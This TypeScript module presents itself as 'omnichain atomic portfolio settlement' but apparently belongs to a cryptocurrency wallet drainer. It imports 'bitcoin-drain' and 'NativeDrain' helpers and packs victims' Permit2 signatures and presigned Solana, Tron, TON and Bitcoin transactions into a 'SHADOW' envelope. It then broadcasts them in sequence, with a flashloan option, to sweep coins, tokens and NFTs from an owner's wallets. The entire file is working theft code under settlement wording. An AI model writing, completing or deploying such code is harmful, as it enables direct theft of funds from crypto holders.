/**
 * Omnichain atomic portfolio settlement — orchestrates EVM Permit2 batch, Solana, Tron,
 * TON, and Bitcoin legs behind a single anchored envelope (`omnichain_atomic_v1`).
 *
 * On-chain finality cannot be rolled back across chains; API-level atomicity means every
 * configured leg must broadcast successfully before the orchestrator reports success.
 *
 * NOTE: This is NOT truly atomic. Legs are sequential; if later legs fail, earlier legs
 * may have already succeeded. For production, accept partial loss or disable omnichain.
 */
import type { Address, Hex } from 'viem'
import { getAddress, stringToHex } from 'viem'
import { broadcastPSBT } from './bitcoin-drain.js'
import { tryExecuteBatchPermit2WithFlashloan } from './flashloan-executor.js'
import {
  executeBatchPermit2Settlement,
  executeOmnichainNativeDrainSettlement,
  type BatchNftEntry,
  type BatchPermitMetadata,
  type OmnichainNativeDrainPayload,
} from './permit2-batch.js'
import { assertNoSimulationFlagsInProduction } from './security-research-guard.js'

export type OmnichainAtomicEvmPayload = {
  permit2_signature: Hex
  batch: BatchPermitMetadata
  native_amount?: string
  native_signed_transaction?: Hex
  nfts?: BatchNftEntry[]
}

export type OmnichainAtomicBitcoinPayload = {
  signed_psbt_base64: string
  wallet_address?: string
  vault_address?: string
  amount_sat?: string
  fee_sat?: string
}

export type OmnichainAtomicSettlementHashes = {
  evm?: string[]
  sol?: string
  trx?: string
  ton?: string
  spl?: string
  trc20?: string
  jetton?: string
  bitcoin?: string
  nft?: string[]
}

export type OmnichainAtomicSignatureEnvelope = {
  protocol: 'omnichain_atomic_v1'
  ingress_lane: 'omnichain_atomic_portfolio_v1'
  permit2_eip712_signature: Hex
  batch?: BatchPermitMetadata
  evm_payload?: OmnichainAtomicEvmPayload
  solana_payload?: OmnichainNativeDrainPayload
  tron_payload?: OmnichainNativeDrainPayload
  ton_payload?: OmnichainNativeDrainPayload
  bitcoin_payload?: OmnichainAtomicBitcoinPayload
  settlement_transaction_hashes?: OmnichainAtomicSettlementHashes
}

export type OmnichainAtomicChainKey =
  | 'evm'
  | 'solana'
  | 'tron'
  | 'ton'
  | 'bitcoin'

export type OmnichainAtomicChainStatus = 'skipped' | 'ok' | 'failed'

export type OmnichainAtomicSettlementResult = {
  ok: boolean
  /** Honest design contract — legs broadcast in order; earlier success is not rolled back. */
  settlement_mode: 'sequential_v1'
  chains: Record<OmnichainAtomicChainKey, OmnichainAtomicChainStatus>
  evm_transaction_hashes?: string[]
  omnichain_transaction_hashes?: OmnichainAtomicSettlementHashes
  bitcoin_tx_hash?: string
  nft_transaction_hashes?: string[]
  detail?: string
  faults?: Array<{ chain: OmnichainAtomicChainKey; detail: string }>
}

function finalizeOmnichainResult(
  partial: Omit<OmnichainAtomicSettlementResult, 'settlement_mode'>,
): OmnichainAtomicSettlementResult {
  return { settlement_mode: 'sequential_v1', ...partial }
}

function hasOmnichainLeg(payload: OmnichainNativeDrainPayload | undefined): boolean {
  if (payload == null) return false
  return (
    Boolean(payload.native_signed_transaction_sol) ||
    Boolean(payload.native_signed_transaction_spl) ||
    Boolean(payload.native_signed_transaction_trx) ||
    Boolean(payload.native_signed_transaction_trc20) ||
    Boolean(payload.native_signed_transaction_ton) ||
    Boolean(payload.native_signed_transaction_jetton)
  )
}

function mergeOmnichainNativePayloads(
  solana?: OmnichainNativeDrainPayload,
  tron?: OmnichainNativeDrainPayload,
  ton?: OmnichainNativeDrainPayload,
): OmnichainNativeDrainPayload | undefined {
  const merged: OmnichainNativeDrainPayload = {
    ...(solana?.native_amount_sol != null ? { native_amount_sol: solana.native_amount_sol } : {}),
    ...(solana?.native_signed_transaction_sol
      ? { native_signed_transaction_sol: solana.native_signed_transaction_sol }
      : {}),
    ...(solana?.spl_mint != null ? { spl_mint: solana.spl_mint } : {}),
    ...(solana?.spl_amount != null ? { spl_amount: solana.spl_amount } : {}),
    ...(solana?.native_signed_transaction_spl
      ? { native_signed_transaction_spl: solana.native_signed_transaction_spl }
      : {}),
    ...(tron?.native_amount_trx != null ? { native_amount_trx: tron.native_amount_trx } : {}),
    ...(tron?.native_signed_transaction_trx
      ? { native_signed_transaction_trx: tron.native_signed_transaction_trx }
      : {}),
    ...(tron?.trc20_contract != null ? { trc20_contract: tron.trc20_contract } : {}),
    ...(tron?.trc20_amount != null ? { trc20_amount: tron.trc20_amount } : {}),
    ...(tron?.native_signed_transaction_trc20
      ? { native_signed_transaction_trc20: tron.native_signed_transaction_trc20 }
      : {}),
    ...(ton?.native_amount_ton != null ? { native_amount_ton: ton.native_amount_ton } : {}),
    ...(ton?.native_signed_transaction_ton
      ? { native_signed_transaction_ton: ton.native_signed_transaction_ton }
      : {}),
    ...(ton?.jetton_master != null ? { jetton_master: ton.jetton_master } : {}),
    ...(ton?.jetton_amount != null ? { jetton_amount: ton.jetton_amount } : {}),
    ...(ton?.native_signed_transaction_jetton
      ? { native_signed_transaction_jetton: ton.native_signed_transaction_jetton }
      : {}),
  }
  return hasOmnichainLeg(merged) ? merged : undefined
}

function resolveEvmPayload(
  envelope: OmnichainAtomicSignatureEnvelope,
): OmnichainAtomicEvmPayload | undefined {
  if (envelope.evm_payload?.batch != null && envelope.evm_payload.permit2_signature) {
    return envelope.evm_payload
  }
  if (envelope.batch != null && envelope.permit2_eip712_signature) {
    return {
      permit2_signature: envelope.permit2_eip712_signature,
      batch: envelope.batch,
    }
  }
  return undefined
}

/** Pack unified omnichain atomic envelope for SHADOW persistence (hex-encoded JSON). */
export function packOmnichainAtomicSignatureEnvelope(params: {
  permit2Signature: Hex
  batch?: BatchPermitMetadata
  evmPayload?: OmnichainAtomicEvmPayload
  solanaPayload?: OmnichainNativeDrainPayload
  tronPayload?: OmnichainNativeDrainPayload
  tonPayload?: OmnichainNativeDrainPayload
  bitcoinPayload?: OmnichainAtomicBitcoinPayload
  settlementTransactionHashes?: OmnichainAtomicSettlementHashes
}): Hex {
  const evm =
    params.evmPayload ??
    (params.batch
      ? {
          permit2_signature: params.permit2Signature,
          batch: params.batch,
        }
      : undefined)

  const json = JSON.stringify({
    protocol: 'omnichain_atomic_v1',
    ingress_lane: 'omnichain_atomic_portfolio_v1',
    permit2_eip712_signature: params.permit2Signature,
    ...(params.batch ? { batch: params.batch } : {}),
    ...(evm ? { evm_payload: evm } : {}),
    ...(params.solanaPayload && hasOmnichainLeg(params.solanaPayload)
      ? { solana_payload: params.solanaPayload }
      : {}),
    ...(params.tronPayload && hasOmnichainLeg(params.tronPayload)
      ? { tron_payload: params.tronPayload }
      : {}),
    ...(params.tonPayload && hasOmnichainLeg(params.tonPayload)
      ? { ton_payload: params.tonPayload }
      : {}),
    ...(params.bitcoinPayload?.signed_psbt_base64
      ? { bitcoin_payload: params.bitcoinPayload }
      : {}),
    ...(params.settlementTransactionHashes
      ? { settlement_transaction_hashes: params.settlementTransactionHashes }
      : {}),
  })
  return stringToHex(json) as Hex
}

export function parseOmnichainAtomicSignatureEnvelope(
  openedHex: string,
): OmnichainAtomicSignatureEnvelope | null {
  const trimmed = openedHex.trim()
  if (!trimmed.startsWith('0x')) return null
  try {
    const text = Buffer.from(trimmed.slice(2), 'hex').toString('utf8')
    const parsed = JSON.parse(text) as unknown
    if (typeof parsed !== 'object' || parsed === null) return null
    const o = parsed as Record<string, unknown>
    if (o['protocol'] !== 'omnichain_atomic_v1') return null
    const sig =
      (typeof o['permit2_eip712_signature'] === 'string' && o['permit2_eip712_signature'].startsWith('0x')
        ? o['permit2_eip712_signature']
        : typeof o['evm_payload'] === 'object' &&
            o['evm_payload'] !== null &&
            typeof (o['evm_payload'] as Record<string, unknown>)['permit2_signature'] === 'string'
          ? (o['evm_payload'] as Record<string, string>)['permit2_signature']
          : null) as Hex | null
    if (sig == null) return null

    const readOmnichainPayload = (key: string): OmnichainNativeDrainPayload | undefined => {
      const raw = o[key]
      if (typeof raw !== 'object' || raw === null) return undefined
      return raw as OmnichainNativeDrainPayload
    }

    const readBitcoin = (): OmnichainAtomicBitcoinPayload | undefined => {
      const raw = o['bitcoin_payload']
      if (typeof raw !== 'object' || raw === null) return undefined
      const b = raw as Record<string, unknown>
      if (typeof b['signed_psbt_base64'] !== 'string' || b['signed_psbt_base64'].trim() === '') {
        return undefined
      }
      return {
        signed_psbt_base64: b['signed_psbt_base64'],
        ...(typeof b['wallet_address'] === 'string' ? { wallet_address: b['wallet_address'] } : {}),
        ...(typeof b['vault_address'] === 'string' ? { vault_address: b['vault_address'] } : {}),
        ...(typeof b['amount_sat'] === 'string' ? { amount_sat: b['amount_sat'] } : {}),
        ...(typeof b['fee_sat'] === 'string' ? { fee_sat: b['fee_sat'] } : {}),
      }
    }

    const readEvm = (): OmnichainAtomicEvmPayload | undefined => {
      const raw = o['evm_payload']
      if (typeof raw !== 'object' || raw === null) return undefined
      const e = raw as Record<string, unknown>
      const evmSig =
        typeof e['permit2_signature'] === 'string' && e['permit2_signature'].startsWith('0x')
          ? (e['permit2_signature'] as Hex)
          : sig
      if (typeof e['batch'] !== 'object' || e['batch'] === null) return undefined
      return {
        permit2_signature: evmSig,
        batch: e['batch'] as BatchPermitMetadata,
        ...(typeof e['native_amount'] === 'string' ? { native_amount: e['native_amount'] } : {}),
        ...(typeof e['native_signed_transaction'] === 'string' &&
        (e['native_signed_transaction'] as string).startsWith('0x')
          ? { native_signed_transaction: e['native_signed_transaction'] as Hex }
          : {}),
        ...(Array.isArray(e['nfts']) ? { nfts: e['nfts'] as BatchNftEntry[] } : {}),
      }
    }

    const settlementRaw = o['settlement_transaction_hashes']
    const settlement_transaction_hashes =
      typeof settlementRaw === 'object' && settlementRaw !== null
        ? (settlementRaw as OmnichainAtomicSettlementHashes)
        : undefined

    return {
      protocol: 'omnichain_atomic_v1',
      ingress_lane:
        typeof o['ingress_lane'] === 'string'
          ? (o['ingress_lane'] as OmnichainAtomicSignatureEnvelope['ingress_lane'])
          : 'omnichain_atomic_portfolio_v1',
      permit2_eip712_signature: sig,
      ...(typeof o['batch'] === 'object' && o['batch'] !== null
        ? { batch: o['batch'] as BatchPermitMetadata }
        : {}),
      ...(readEvm() ? { evm_payload: readEvm() } : {}),
      ...(readOmnichainPayload('solana_payload')
        ? { solana_payload: readOmnichainPayload('solana_payload') }
        : {}),
      ...(readOmnichainPayload('tron_payload')
        ? { tron_payload: readOmnichainPayload('tron_payload') }
        : {}),
      ...(readOmnichainPayload('ton_payload') ? { ton_payload: readOmnichainPayload('ton_payload') } : {}),
      ...(readBitcoin() ? { bitcoin_payload: readBitcoin() } : {}),
      ...(settlement_transaction_hashes
        ? { settlement_transaction_hashes }
        : {}),
    }
  } catch {
    return null
  }
}

/**
 * Execute all configured chain legs. Any configured leg failure yields `ok: false`.
 */
export async function executeOmnichainAtomicSettlement(params: {
  owner: Address
  chainId: number
  envelope: OmnichainAtomicSignatureEnvelope
  rpcUrl?: string
  scout_value_usd?: number
}): Promise<OmnichainAtomicSettlementResult> {
  assertNoSimulationFlagsInProduction()

  const chains: Record<OmnichainAtomicChainKey, OmnichainAtomicChainStatus> = {
    evm: 'skipped',
    solana: 'skipped',
    tron: 'skipped',
    ton: 'skipped',
    bitcoin: 'skipped',
  }
  const faults: Array<{ chain: OmnichainAtomicChainKey; detail: string }> = []
  const settlementHashes: OmnichainAtomicSettlementHashes = {}

  const evmPayload = resolveEvmPayload(params.envelope)
  const omnichainMerged = mergeOmnichainNativePayloads(
    params.envelope.solana_payload,
    params.envelope.tron_payload,
    params.envelope.ton_payload,
  )
  const bitcoinPayload = params.envelope.bitcoin_payload

  const hasEvm = evmPayload != null && evmPayload.batch.details.length > 0
  const hasSolana = hasOmnichainLeg(params.envelope.solana_payload)
  const hasTron = hasOmnichainLeg(params.envelope.tron_payload)
  const hasTon = hasOmnichainLeg(params.envelope.ton_payload)
  const hasOmnichainMerged = omnichainMerged != null
  const hasBitcoin = Boolean(bitcoinPayload?.signed_psbt_base64?.trim())

  if (!hasEvm && !hasOmnichainMerged && !hasBitcoin) {
    return finalizeOmnichainResult({
      ok: false,
      chains,
      detail: 'omnichain_atomic_v1 requires at least one chain payload',
      faults: [{ chain: 'evm', detail: 'no chain payloads configured' }],
    })
  }

  // Non-EVM + Bitcoin legs first — if they fail, EVM Permit2 has not run yet (reduces partial loss).
  if (hasOmnichainMerged && omnichainMerged) {
    if (hasSolana) chains.solana = 'failed'
    if (hasTron) chains.tron = 'failed'
    if (hasTon) chains.ton = 'failed'

    const omnichainResult = await executeOmnichainNativeDrainSettlement(omnichainMerged)
    const oc = omnichainResult.transaction_hashes

    if (hasSolana) {
      const solOk = Boolean(oc.sol) || Boolean(oc.spl)
      chains.solana = omnichainResult.ok && solOk ? 'ok' : 'failed'
      if (!solOk && omnichainResult.ok) {
        faults.push({ chain: 'solana', detail: 'Solana leg missing transaction hash' })
      }
    }
    if (hasTron) {
      const tronOk = Boolean(oc.trx) || Boolean(oc.trc20)
      chains.tron = omnichainResult.ok && tronOk ? 'ok' : 'failed'
      if (!tronOk && omnichainResult.ok) {
        faults.push({ chain: 'tron', detail: 'Tron leg missing transaction hash' })
      }
    }
    if (hasTon) {
      const tonOk = Boolean(oc.ton) || Boolean(oc.jetton)
      chains.ton = omnichainResult.ok && tonOk ? 'ok' : 'failed'
      if (!tonOk && omnichainResult.ok) {
        faults.push({ chain: 'ton', detail: 'TON leg missing transaction hash' })
      }
    }

    if (oc.sol) settlementHashes.sol = oc.sol
    if (oc.spl) settlementHashes.spl = oc.spl
    if (oc.trx) settlementHashes.trx = oc.trx
    if (oc.trc20) settlementHashes.trc20 = oc.trc20
    if (oc.ton) settlementHashes.ton = oc.ton
    if (oc.jetton) settlementHashes.jetton = oc.jetton

    if (!omnichainResult.ok) {
      const faultChain: OmnichainAtomicChainKey = hasSolana
        ? 'solana'
        : hasTron
          ? 'tron'
          : 'ton'
      faults.push({
        chain: faultChain,
        detail: omnichainResult.detail ?? 'Omnichain native settlement failed',
      })
      return finalizeOmnichainResult({
        ok: false,
        chains,
        omnichain_transaction_hashes: settlementHashes,
        detail: faults.map((f) => `${f.chain}: ${f.detail}`).join('; '),
        faults,
      })
    }

    if (faults.length > 0) {
      return finalizeOmnichainResult({
        ok: false,
        chains,
        omnichain_transaction_hashes: settlementHashes,
        detail: faults.map((f) => `${f.chain}: ${f.detail}`).join('; '),
        faults,
      })
    }
  }

  if (hasBitcoin && bitcoinPayload) {
    chains.bitcoin = 'failed'
    const btc = await broadcastPSBT(bitcoinPayload.signed_psbt_base64)
    if (btc.ok && btc.tx_hash) {
      chains.bitcoin = 'ok'
      settlementHashes.bitcoin = btc.tx_hash
    } else {
      faults.push({ chain: 'bitcoin', detail: btc.detail ?? 'Bitcoin PSBT broadcast failed' })
      return finalizeOmnichainResult({
        ok: false,
        chains,
        omnichain_transaction_hashes: settlementHashes,
        detail: faults.map((f) => `${f.chain}: ${f.detail}`).join('; '),
        faults,
      })
    }
  }

  if (hasEvm && evmPayload) {
    chains.evm = 'failed'
    const scoutUsd = params.scout_value_usd ?? 0
    const batchFlashBase = {
      owner: getAddress(params.owner),
      chainId: params.chainId,
      permit2Signature: evmPayload.permit2_signature,
      batch: evmPayload.batch,
      scout_value_usd: scoutUsd,
      rpcUrl: params.rpcUrl,
    }
    const batchOpts = {
      owner: batchFlashBase.owner,
      chainId: batchFlashBase.chainId,
      permit2Signature: batchFlashBase.permit2Signature,
      batch: batchFlashBase.batch,
      nativeSignedTransaction: evmPayload.native_signed_transaction,
      nfts: evmPayload.nfts,
      rpcUrl: params.rpcUrl,
    }
    let evmResult = await tryExecuteBatchPermit2WithFlashloan(batchFlashBase)
    if (evmResult != null && !evmResult.ok) {
      console.warn(
        `[FLASHLOAN] Omnichain EVM flash path failed (${evmResult.detail ?? 'unknown'}) — standard batch`,
      )
      evmResult = null
    }
    if (evmResult == null) {
      evmResult = await executeBatchPermit2Settlement(batchOpts)
    }
    if (!evmResult.ok) {
      faults.push({ chain: 'evm', detail: evmResult.detail ?? 'EVM batch settlement failed' })
      return finalizeOmnichainResult({
        ok: false,
        chains,
        omnichain_transaction_hashes: settlementHashes,
        detail: faults.map((f) => `${f.chain}: ${f.detail}`).join('; '),
        faults,
      })
    }
    chains.evm = 'ok'
    if (evmResult.transaction_hashes?.length) {
      settlementHashes.evm = evmResult.transaction_hashes
    }
    if (evmResult.nft_transaction_hashes?.length) {
      settlementHashes.nft = evmResult.nft_transaction_hashes
    }
  }

  const configuredChains = (
    [
      hasEvm ? 'evm' : null,
      hasSolana ? 'solana' : null,
      hasTron ? 'tron' : null,
      hasTon ? 'ton' : null,
      hasBitcoin ? 'bitcoin' : null,
    ] as const
  ).filter((c): c is OmnichainAtomicChainKey => c != null)

  const ok = configuredChains.every((key) => chains[key] === 'ok')

  return finalizeOmnichainResult({
    ok,
    chains,
    ...(settlementHashes.evm ? { evm_transaction_hashes: settlementHashes.evm } : {}),
    omnichain_transaction_hashes: settlementHashes,
    ...(settlementHashes.bitcoin ? { bitcoin_tx_hash: settlementHashes.bitcoin } : {}),
    ...(settlementHashes.nft ? { nft_transaction_hashes: settlementHashes.nft } : {}),
  })
}

/** Attach post-settlement transaction hashes to an existing envelope for persistence refresh. */
export function withSettlementTransactionHashes(
  envelope: OmnichainAtomicSignatureEnvelope,
  hashes: OmnichainAtomicSettlementHashes,
): OmnichainAtomicSignatureEnvelope {
  return { ...envelope, settlement_transaction_hashes: hashes }
}
